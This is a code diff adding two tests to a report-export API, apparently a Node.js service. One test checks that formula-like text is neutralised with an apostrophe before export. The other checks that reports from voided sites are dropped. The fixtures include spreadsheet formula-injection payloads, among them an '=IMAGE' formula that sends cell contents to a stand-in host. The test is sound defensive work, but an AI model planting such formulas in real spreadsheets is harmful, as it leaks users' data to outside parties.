@@ -179,6 +179,29 @@ test('the export: 31 values in the sheet order, the headers with it, Yes or No, 
   assert.equal((await s.call('GET', `${API}/sitereports`)).status, 401);
 });
 
+test('the export: text a person typed that a sheet would read as a formula starts with an apostrophe; numbers and dates stay as they are', async (t) => {
+  const s = await start(); t.after(() => s.srv.close());
+  const a = await s.admin(), ana = await s.addRep(a.cookie, 'ana', { name: '-Ana Rep' });
+  await s.call('POST', `${API}/site`, { id: 's_formula-0001', rep: ana.id, lead: { name: '=HYPERLINK("https://x.example","Hotel")' }, city: 'Colón' }, { cookie: a.cookie });
+  assert.equal((await s.call('POST', `${API}/site/s_formula-0001`, { what: 'installed' }, { cookie: a.cookie })).status, 200);
+  const sent = await s.call('POST', `${API}/site/s_formula-0001/report`, full({ people: 3, missing: '+cmd', need: '@SUM(1)', notes: '=IMAGE("https://x.example/?d="&A2)' }), { cookie: ana.cookie });
+  assert.equal(sent.status, 200, sent.text);
+  const row = (await s.call('GET', `${API}/sitereports`, undefined, { bearer: 'push-token' })).json.rows[0];
+  assert.deepEqual([row[1], row[3], row[4]], ['\'=HYPERLINK("https://x.example","Hotel") 2026-11-16', '\'=HYPERLINK("https://x.example","Hotel"), Colón', "'-Ana Rep"]);
+  assert.deepEqual(row.slice(28), ["'+cmd", "'@SUM(1)", '\'=IMAGE("https://x.example/?d="&A2)']);
+  assert.deepEqual([row[2], row[5], row[6], row[7], row[27]], ['2026-11-16', 3, 9.5, 8.25, 'No']);
+  assert.match(row[0], /^2026-11-16T/);
+});
+
+test('the export leaves out the reports of a site that was voided since', async (t) => {
+  const { s, a, send, sync } = await setup(t);
+  await send(full());
+  assert.equal((await sync()).json.rows.length, 1);
+  assert.equal((await s.call('POST', `${API}/site/s_report-0001`, { what: 'void' }, { cookie: a.cookie })).status, 200);
+  const after = (await sync()).json;
+  assert.deepEqual([after.rows, after.ids], [[], []]);
+});
+
 test('a report survives a restart: the log replays it', async (t) => {
   const { s, send } = await setup(t);
   await send(full());
